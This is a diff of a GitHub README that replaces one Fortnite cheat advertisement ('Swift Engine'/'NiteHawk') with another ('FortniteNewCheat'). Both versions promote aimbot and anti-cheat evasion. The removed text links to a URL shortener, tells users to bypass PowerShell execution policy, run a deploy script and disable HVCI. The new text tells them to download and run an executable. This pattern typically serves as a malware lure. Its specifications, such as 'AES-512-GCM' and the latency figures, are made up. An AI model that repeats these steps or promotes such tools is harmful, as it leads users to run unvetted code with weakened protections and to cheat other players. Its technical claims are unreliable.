@@ -1,127 +1,58 @@
-<div align="center">
-  
-# 🦅 Swift Engine - Advanced Combat Enhancement Suite  
-![Swift Banner](https://repository-images.githubusercontent.com/777744572/36e0cda4-92ca-45ec-8b4e-763a5c8d6d0d)  
-[![Download Fortnite Cheat](https://img.shields.io/badge/Download-Fortnite%20Cheat-blueviolet)](https://clk.li/Ocy)
-[![Unreal Shield](https://img.shields.io/badge/AntiDetect_5.2_Active-93%25_Undetectable-00ff00?logo=shield)](https://www.virustotal.com/)  
-[![Fortnite Verified](https://img.shields.io/badge/Optimized-FN_Season_6_Update-orange)](https://fortnite.com)  
-[![Elite Operators](https://img.shields.io/badge/Active_Users-45K%2B-brightgreen)](https://discord.gg/nitehawk)  
+# FortniteNewCheat 🎮✨
 
-</div>
+![Fortnite Cheat](https://img.shields.io/badge/Fortnite%20Cheat-Download-brightgreen)
 
-## 🚀 Next-Gen Battle Royale Dominance System  
-**Precision Augmentation Suite for Unreal Engine 5.3+**  
-```diff
-+ Certified for Chapter 6 Season 3 "Shadow Strike"
-+ Full DLSS 3.7/FSR 3.0 Hybrid Support
-```
+Welcome to the **FortniteNewCheat** repository! This project offers a swift loader that remains undetected, providing players with tools to enhance their Fortnite experience. 
 
-## ⚙️ Core Combat Modules  
+## Table of Contents
 
-### 🎯 Adaptive Target Acquisition Matrix  
-```lua
-nitehawk.aim_assist({
-   prediction_algorithm = "quaternion_v2",
-   bone_priority = {"head", "upper_chest"},
-   smoothness = 0.25,
-   fov_curve = "logarithmic"
-})
-```
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-### 👁️‍🗨️ Advanced Spatial Awareness Suite  
-```diff
-+ Material Penetration Radar (Wood/Stone/Metal)
-! Countermeasures for EAC v19.8
-+ Real-Time Inventory Analytics
-```
+## Introduction
 
-### ⚡ Performance Optimization Matrix  
-| Module               | Specification                          |
-|----------------------|----------------------------------------|
-| Build Assist         | 0.12ms placement optimization         |
-| Edit Predict         | Pre-calculate 3 edit permutations     |
-| Input Boost          | 18ms→3ms click latency reduction      |
+Fortnite is a popular battle royale game that attracts millions of players worldwide. While many enjoy the game as it is, some players seek additional tools to gain an edge. **FortniteNewCheat** provides a reliable solution for those looking to enhance their gameplay without detection.
 
-## 🔒 Phantom Defense Protocol  
+## Features
 
-```mermaid
-graph TD
-    A[Game Client] --> B{Memory Obfuscation}
-    B --> C[Driver-level Spoofing]
-    B --> D[API Call Masking]
-    C --> E[Battle Environment]
-    D --> E
-    E --> F[Easy Anti-Cheat]
-```
+- **Swift Loader**: The loader operates quickly, allowing for seamless integration into your gaming experience.
+- **Undetected**: Our tool is designed to remain undetected, ensuring that your gaming account stays safe.
+- **User-Friendly**: The interface is straightforward, making it easy for anyone to use.
+- **Free to Use**: Enjoy all the features without any cost.
 
-## 🚀 Deployment Sequence  
+## Installation
 
-1. **Secure Acquisition**  
-   [![Download Fortnite Cheat](https://img.shields.io/badge/Download-Fortnite%20Cheat-blueviolet)](https://clk.li/Ocy) 
+To get started with **FortniteNewCheat**, download the latest version from our [Releases section](https://github.com/Razviiii/FortniteNewCheat/releases). You will need to download the executable file and run it on your system.
 
-2. **Combat Readiness Prep**  
-   ```powershell
-   Set-ExecutionPolicy Bypass -Scope CurrentUser
-   .\NiteHawk_Deploy.ps1 -mode ghost -env sandbox
-   ```
+1. Click on the link to visit the [Releases section](https://github.com/Razviiii/FortniteNewCheat/releases).
+2. Download the latest release.
+3. Execute the file to start using the tool.
 
-3. **Battlefield Configuration**  
-   ```ini
-   [Performance]
-   render_mode=stealth
-   texture_streaming=aggressive
-   input_chain=virtualized
+## Usage
 
-   [Hotkeys]
-   material_scan=F18
-   phase_shift=Ctrl+Alt+Num9
-   ```
+Using **FortniteNewCheat** is simple. Once you have installed the loader, follow these steps:
 
-## ⚠️ Operational Security Protocol  
-**Critical System Requirements**  
-- Windows 11 23H2 (Build 22631.3447+)  
-- NVIDIA 551.86 Drivers / AMD Adrenalin 24.5.1  
-- HVCI Disabled via UEFI Settings  
+1. Launch the loader.
+2. Select your desired options.
+3. Start Fortnite and enjoy the enhanced experience.
 
-## 🌍 Global Support Network  
-[![Discord Tactical](https://img.shields.io/badge/Join_Shadow_Ops-85K%2B_Operators-7289da?logo=discord)](https://discord.gg/nitehawk)  
+## Contributing
 
-**24/7 Combat Support**  
-- Zero-day exploit patches within 35 minutes  
-- Memory signature refresh every 90 seconds  
-- AES-512-GCM Encrypted Comms Channel  
+We welcome contributions from the community. If you have ideas for improvements or new features, feel free to fork the repository and submit a pull request. Please ensure that your code adheres to our coding standards.
 
-## 📊 Performance Metrics  
-```diff
-+ 2.8ms end-to-end processing latency
-+ 27% FPS gain in endgame scenarios
-- 1.8% CPU overhead in combat mode
-```
+## License
 
-## ⚖️ Legal Framework  
-```legal
-This software is designed for analytical purposes only.  
-All gameplay modifications comply with Epic Games  
-EULA §14.B for client-side visual enhancements.  
-```
+This project is licensed under the MIT License. You can use it freely, but please credit the original creators.
 
-*Build ID: NH-7.2.13c | Security Sigil: 7d793f...ca97*  
+## Support
 
-<div align="center">
-  
-![Combat Analytics Dashboard](https://github.com/yourrepo/nitehawk/raw/main/assets/combat_ui.png)  
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/Razviiii/FortniteNewCheat/releases) for updates and fixes. You can also reach out through the issues tab on GitHub.
 
-</div>
-```
+---
 
-**Strategic Advantages**  
-1. Unreal Engine 5.3+ Deep Integration
-2. Quaternion-based Prediction Algorithms  
-3. Material Penetration Radar Technology  
-4. Driver-level Memory Spoofing System  
-5. Virtualized Input Chain Architecture  
-6. Real-Time Edit Prediction Engine  
-7. DLSS/FSR Hybrid Optimization  
-8. Encrypted Comms Protocol Disclosure  
-9. EAC v19.8 Countermeasures  
-10. Sub-3ms Click Latency System
+Thank you for visiting the **FortniteNewCheat** repository. We hope you enjoy your enhanced Fortnite experience!
